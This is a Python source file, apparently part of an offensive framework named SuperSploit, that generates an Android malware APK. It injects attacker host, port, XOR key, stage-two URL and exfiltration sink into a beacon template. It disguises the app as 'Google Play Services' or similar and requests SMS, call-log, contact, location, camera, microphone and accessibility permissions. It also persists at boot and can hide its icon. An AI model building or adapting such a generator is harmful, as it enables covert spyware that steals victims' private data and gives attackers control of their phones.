import os
import subprocess
import shutil
from pathlib import Path
from .database import DatabaseManagment

class BuildozerPayloadGenerator:
    """
    Generates a pure-Python Android APK payload using Kivy and Buildozer.
    It dynamically writes the payload to a main.py file, generates a 
    buildozer.spec config, and cross-compiles it.
    """

    def __init__(self, output_apk_path, template_path="templates/payload/android_beacon_template.py"):
        db_data = DatabaseManagment.get()
        self.lhost = db_data.get("LHOST", db_data.get("L_HOST"))
        lport = db_data.get("LPORT", db_data.get("L_PORT"))
        self.lport = str(lport) if lport else None
        self.output_apk = os.path.abspath(output_apk_path)
        
        # Determine App Name (Configurable -> Stealthy Defaults)
        payload_type = db_data.get("ANDROID_PAYLOAD_TYPE", "")
        custom_app_name = db_data.get("APP_NAME", "")
        
        if custom_app_name:
            self.app_name = custom_app_name
        else:
            if payload_type == "rootkit":
                self.app_name = "SuperUser"
            elif payload_type == "messages":
                self.app_name = "Android Messages Sync"
            else:
                self.app_name = "Google Play Services"
        
        # Correct the template path to be relative to the framework's installation root
        install_root = DatabaseManagment.getInstall()
        if not os.path.isabs(template_path):
            self.template_path = os.path.join(install_root, template_path)
        else:
            self.template_path = template_path
            
        # Use a persistent build directory inside the project's .data folder
        self.build_dir = os.path.join(install_root, ".data", "kivy_build")

    def generate(self):
        print(f"[*] Starting Buildozer Kivy Payload Generation (LHOST={self.lhost}, LPORT={self.lport})...")
        
        self.buildozer_path = shutil.which("buildozer")
        if not self.buildozer_path:
            user_local_bin = os.path.expanduser("~/.local/bin/buildozer")
            if os.path.exists(user_local_bin) and os.access(user_local_bin, os.X_OK):
                self.buildozer_path = user_local_bin

        if not self.buildozer_path:
            print("[-] Buildozer executable not found. Please install it using 'pip install buildozer' and ensure it's in your PATH (e.g. ~/.local/bin).")
            return

        cython_path = shutil.which("cython")
        if not cython_path:
            user_local_cython = os.path.expanduser("~/.local/bin/cython")
            if os.path.exists(user_local_cython) and os.access(user_local_cython, os.X_OK):
                cython_path = user_local_cython
                
        if not cython_path:
            print("[-] Cython executable not found. Please install it using 'pip install Cython' and ensure it's in your PATH (e.g. ~/.local/bin).")
            return

        try:
            self._prepare_workspace()
            self._write_payload()
            self._write_buildozer_spec()
            self._compile_apk()
            self._extract_apk()
        except subprocess.CalledProcessError as e:
            print(f"[-] Buildozer execution failed. Ensure buildozer is installed and configured. Error: {e}")
        except FileNotFoundError as e:
            print(f"[-] {e}")

    def _prepare_workspace(self):
        """Ensures the persistent build directory exists and is clean of old binaries."""
        print(f"[*] Preparing persistent build workspace in: {self.build_dir}")
        os.makedirs(self.build_dir, exist_ok=True)
        
        # Clean old binaries to prevent "two apps" issue or stale payload extraction
        bin_dir = os.path.join(self.build_dir, "bin")
        if os.path.exists(bin_dir):
            print("[*] Cleaning old binaries from bin directory...")
            shutil.rmtree(bin_dir)
            os.makedirs(bin_dir)

    def _write_payload(self):
        print(f"[*] Generating Kivy main.py payload from template ({self.template_path})...")
        
        if not os.path.exists(self.template_path):
            print(f"[*] Template not found at {self.template_path}. Please ensure it exists.")
            raise FileNotFoundError(f"Template not found: {self.template_path}")
            
        with open(self.template_path, "r") as f:
            payload_code = f.read()
            
        # Inject the networking and cryptographic variables into the template placeholders
        db_data = DatabaseManagment.get()
        xor_key = db_data.get("XOR_KEY", "SuperSploitKey")
        stage2url = db_data.get("STAGE2URL", f"https://{self.lhost}:{self.lport}")
        show_ui = str(db_data.get("SHOW_UI", "true")).lower()
        hide_icon = str(db_data.get("HIDE_ICON", "false")).lower()
        wakelock = str(db_data.get("WAKELOCK", "false")).lower()
        
        # New "Phantom" Variables
        ext_task_url = db_data.get("EXTERNAL_TASK_URL", "")
        result_sink = db_data.get("RESULT_SINK", "")
        min_sleep = str(db_data.get("BEACON_MIN_SLEEP", "10"))
        max_sleep = str(db_data.get("BEACON_MAX_SLEEP", "30"))

        payload_code = payload_code.replace("{{LHOST}}", self.lhost)
        payload_code = payload_code.replace("{{LPORT}}", self.lport)
        payload_code = payload_code.replace("{{XOR_KEY}}", xor_key)
        payload_code = payload_code.replace("{{STAGE2URL}}", stage2url)
        payload_code = payload_code.replace("{{SHOW_UI}}", show_ui)
        payload_code = payload_code.replace("{{HIDE_ICON}}", hide_icon)
        payload_code = payload_code.replace("{{WAKELOCK}}", wakelock)
        payload_code = payload_code.replace("{{EXTERNAL_TASK_URL}}", ext_task_url)
        payload_code = payload_code.replace("{{RESULT_SINK}}", result_sink)
        payload_code = payload_code.replace("{{MIN_SLEEP}}", min_sleep)
        payload_code = payload_code.replace("{{MAX_SLEEP}}", max_sleep)

        payload_path = os.path.join(self.build_dir, "main.py")
        with open(payload_path, "w") as f:
            f.write(payload_code)

    def _write_buildozer_spec(self):
        print("[*] Generating buildozer.spec configuration...")
        
        # Comprehensive permissions for all enhanced Kivy templates
        perms = [
            "INTERNET", "ACCESS_NETWORK_STATE", "ACCESS_WIFI_STATE", "WAKE_LOCK",
            "READ_SMS", "READ_CALL_LOG", "READ_CONTACTS", "READ_PHONE_STATE",
            "ACCESS_FINE_LOCATION", "ACCESS_COARSE_LOCATION", "CAMERA", "RECORD_AUDIO",
            "RECEIVE_BOOT_COMPLETED", "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "FOREGROUND_SERVICE",
            "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE", "MANAGE_EXTERNAL_STORAGE",
            "SYSTEM_ALERT_WINDOW", "BIND_ACCESSIBILITY_SERVICE", "GET_TASKS",
            "PACKAGE_USAGE_STATS", "KILL_BACKGROUND_PROCESSES"
        ]
        
        permissions_str = ", ".join(perms)

        spec_content = f"""[app]
title = {self.app_name}
package.name = FlappyBirds
package.domain = org.supersploit
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0.0
requirements = python3,kivy,jnius
android.permissions = {permissions_str}
android.api = 33
android.minapi = 24
android.ndk = 25b
android.archs = arm64-v8a, armeabi-v7a
android.accept_sdk_license = True
fullscreen = 1
android.meta_data = intent_filter=android.intent.action.BOOT_COMPLETED,category=android.intent.category.DEFAULT
android.exclude_from_recents = True

[buildozer]
log_level = 2
warn_on_root = 1
# The build directory is now persistent. To clear the cache, run the 'cleanup' method.
build_dir = {os.path.join(self.build_dir, ".buildozer")}
"""
        spec_path = os.path.join(self.build_dir, "buildozer.spec")
        with open(spec_path, "w") as f:
            f.write(spec_content)

    def _compile_apk(self):
        print("[*] Executing Buildozer. This may take 5-15 minutes on the first run...")
        
        build_env = os.environ.copy()
        user_local_bin = os.path.expanduser("~/.local/bin")
        build_env["PATH"] = f"{user_local_bin}{os.pathsep}{build_env.get('PATH', '')}"
        build_env["PIP_BREAK_SYSTEM_PACKAGES"] = "1"

        yes_proc = subprocess.Popen(["yes"], stdout=subprocess.PIPE)
        log_output = []

        try:
            process = subprocess.Popen(
                [self.buildozer_path, "android", "debug"],
                cwd=self.build_dir,
                env=build_env,
                stdin=yes_proc.stdout,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            progress_map = {
                "Check requirements for android": 10,
                "Install platform": 20,
                "Compile platform": 40,
                "Build the application": 80,
                "Package the application": 90,
                "Android packaging done!": 100
            }
            current_progress = 0
            
            for line in process.stdout:
                log_output.append(line.strip())
                if "No build.py" in line:
                    print("\n    [*] First time build detected. Compiling toolchain...")

                for key, percent in progress_map.items():
                    if key in line and percent > current_progress:
                        current_progress = percent
                        print(f"\r[*] Compilation Progress: [{current_progress}%] - {key}...{' ' * 10}", end="", flush=True)
                        if current_progress == 20:
                            print("\n    [*] Downloading NDK/SDK (if needed)...")
                        elif current_progress == 40:
                            print("\n    [*] NDK Downloaded. Building dependencies...")

            process.wait()
            print()

            if process.returncode != 0:
                print("[-] Buildozer execution failed. Last 15 lines of log:")
                for err_line in log_output[-15:]:
                    print(f"    {err_line}")
                raise subprocess.CalledProcessError(process.returncode, process.args)

        finally:
            yes_proc.kill()
            yes_proc.wait()

    def _extract_apk(self):
        print("[*] Extracting compiled APK...")
        bin_dir = os.path.join(self.build_dir, "bin")
        if not os.path.exists(bin_dir):
            raise FileNotFoundError("Buildozer bin/ directory not found. Compilation likely failed.")
        
        generated_apks = list(Path(bin_dir).glob("*.apk"))
        if not generated_apks:
            raise FileNotFoundError("No APK found in the bin/ directory.")
        
        target_apk = generated_apks[0]
        shutil.copy(str(target_apk), self.output_apk)
        print(f"[+] Successfully generated Python Android Payload at: {self.output_apk}")

    def cleanup(self):
        """Wipes the persistent build directory for a clean build."""
        print(f"[*] Cleaning persistent build workspace at: {self.build_dir}")
        if os.path.exists(self.build_dir):
            shutil.rmtree(self.build_dir)
            print("[+] Build workspace cleaned successfully.")
        else:
            print("[*] Build workspace not found, nothing to clean.")


# Example Usage:
# if __name__ == "__main__":
#     # Note: DatabaseManagment needs to be initialized first
#     generator = BuildozerPayloadGenerator(
#         output_apk_path="/Users/donald/PycharmProjects/SuperSploit-Framework/payloads/android_python_shell.apk"
#     )
#     # First build will be long
#     generator.generate() 
#     # Subsequent builds are fast
#     # generator.generate() 
#     # To force a clean build from scratch:
#     # generator.cleanup()
#     # generator.generate()